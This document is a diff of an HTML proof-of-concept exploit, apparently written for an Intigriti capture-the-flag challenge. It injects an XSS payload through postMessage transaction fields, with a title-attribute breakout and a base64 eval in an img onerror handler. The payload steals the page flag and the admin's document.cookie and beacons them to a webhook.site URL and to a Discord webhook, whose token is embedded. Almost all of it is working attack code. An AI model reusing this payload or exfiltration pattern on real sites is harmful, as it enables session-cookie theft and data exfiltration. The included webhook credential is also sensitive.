@@ -4,67 +4,83 @@
     <meta charset="UTF-8">
     <title>Exploit POC</title>
 </head>
-<body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
+<body style="font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #1a1a1a; color: #fff;">
 
-    <h1>Exploit Ready (Multi-Currency)</h1>
-    <button onclick="execute()" style="padding: 20px 40px; font-size: 20px; cursor: pointer; background: #e74c3c; color: white; border: none; border-radius: 5px;">
+    <h1 style="color: #00FF88;">Exploit Ready: Dual Channel</h1>
+    <p>Exfiltration targets: Webhook.site + Discord</p>
+    
+    <button onclick="execute()" style="padding: 20px 40px; font-size: 20px; cursor: pointer; background: #5865F2; color: white; border: none; border-radius: 5px; font-weight: bold;">
         LAUNCH ATTACK 🚀
     </button>
-    <div id="log" style="margin-top: 20px; font-family: monospace;"></div>
+    
+    <div id="log" style="margin-top: 20px; font-family: monospace; color: #ccc;">Waiting for launch...</div>
 
     <script>
-        // --- CONFIG ---
+        // --- CONFIGURATION ---
         const TARGET_BASE = "https://challenge-0126.intigriti.io";
         const CHECKOUT_URL = TARGET_BASE + "/checkout.html";
         const MARKETWATCH_URL = TARGET_BASE + "/marketwatch.html";
+        
+        // 1. Webhook.site
         const WEBHOOK_URL = "https://webhook.site/8213b378-934a-402b-8f55-fc2bac82c32d";
+        
+        // 2. Discord Webhook
+        const DISCORD_URL = "https://discord.com/api/webhooks/1463231849550581891/xi0StB5ZOeisP2iDil0iuOYJzYhT6SYt4L4WWrEzgLqmJjSl0N5xyhrgX0zrjAq7q9o0";
 
         function log(msg) {
             document.getElementById("log").innerText = msg;
             console.log(msg);
         }
 
-        // --- THE MALICIOUS PAYLOAD (Runs on Admin's browser) ---
-        // 1. Send a 'PING' immediately so we know XSS fired.
-        // 2. Fetch checkout.html to get the flag.
-        // 3. Send the data using navigator.sendBeacon (reliable).
+        // --- THE PAYLOAD (Runs on Admin's browser) ---
         const exfilScript = `
-            var hook = "${WEBHOOK_URL}";
-            
-            // Step 1: Immediate Ping
-            new Image().src = hook + "?type=ping_xss_fired";
+            var hookSite = "${WEBHOOK_URL}";
+            var discordHook = "${DISCORD_URL}";
 
-            // Step 2: Steal Data
+            // Helper: Send to Discord via Beacon (CORS Bypass attempt)
+            function sendToDiscord(content) {
+                var data = JSON.stringify({
+                    username: "Flag Stealer",
+                    content: "🚩 **FLAG CAPTURED:** " + content
+                });
+                // Send as Blob to force correct Content-Type for Discord
+                var blob = new Blob([data], { type: 'application/json' });
+                navigator.sendBeacon(discordHook, blob);
+            }
+
+            // Step 1: Steal Data
             fetch('/checkout.html')
             .then(r => r.text())
             .then(html => {
-                // Extract flag content safely
-                var flag = "NOT_FOUND";
+                // Extract flag content
+                var flag = "FLAG_NOT_FOUND";
                 if(html.indexOf("FLAG:") > -1) {
                     var start = html.indexOf("FLAG:");
-                    flag = html.substring(start, start + 50); // Grab 50 chars around FLAG:
+                    flag = html.substring(start, start + 60); // Grab chars around FLAG:
                 }
-                
                 var cookies = document.cookie;
+                
+                // CHANNEL 1: Send to Webhook.site (Reliable)
                 var payload = new FormData();
                 payload.append('flag', flag);
                 payload.append('cookie', cookies);
-                
-                // Use sendBeacon for reliability
-                navigator.sendBeacon(hook + "?type=data", payload);
+                navigator.sendBeacon(hookSite + "?type=data", payload);
+
+                // CHANNEL 2: Send to Discord
+                sendToDiscord(flag + "\\n\\n🍪 Cookie: " + cookies);
             })
             .catch(e => {
-                navigator.sendBeacon(hook + "?type=error&msg=" + btoa(e.toString()));
+                navigator.sendBeacon(hookSite + "?type=error&msg=" + btoa(e.toString()));
             });
         `;
 
+        // Encode payload
         const base64Exfil = btoa(exfilScript);
         
-        // We add "0x" to bypass potential "is this a crypto address?" regex filters
-        // Then we close the title attribute and inject the payload.
+        // The Injection (Bypasses title tag + runs payload)
         const xssPayload = `0x"><img src=x onerror=eval(atob('${base64Exfil}'))>`;
 
-        // --- EXECUTION ---
+        // --- EXECUTION LOOP ---
         function execute() {
             log("Opening target window...");
             let win = window.open(CHECKOUT_URL, "targetWindow");
@@ -73,32 +89,31 @@
             setTimeout(() => {
                 log("Spamming payloads (BTC, XMR, 1337COIN)...");
 
-                // List of likely currencies the Admin might have
-                const currencies = ["1337COIN", "BTC", "ETH", "XMR"];
-                
+                const currencies = ["1337COIN", "BTC", "XMR"];
                 let attempts = 0;
+                
                 let interval = setInterval(() => {
                     attempts++;
-                    
-                    // Cycle through currencies to ensure we hit one the admin owns
                     let curr = currencies[attempts % currencies.length];
 
+                    // Send Malicious Transaction
                     win.postMessage({
                         type: "submitTransaction",
                         transaction: {
                             currency: curr,
-                            amount: 0.0001, // Small amount
+                            amount: 1337,
                             toAddress: xssPayload
                         }
                     }, "*");
 
                     if (attempts % 5 === 0) log(`Sent ${attempts} payloads...`);
 
-                    // Stop after 20 attempts (10 seconds)
+                    // Stop after 20 attempts and trigger XSS
                     if (attempts > 20) {
                         clearInterval(interval);
-                        log("Triggering XSS (Redirecting)...");
+                        log("REDIRECTING Admin to MarketWatch...");
                         win.location.href = MARKETWATCH_URL;
+                        log("Exploit finished. Check Discord!");
                     }
                 }, 500);
 
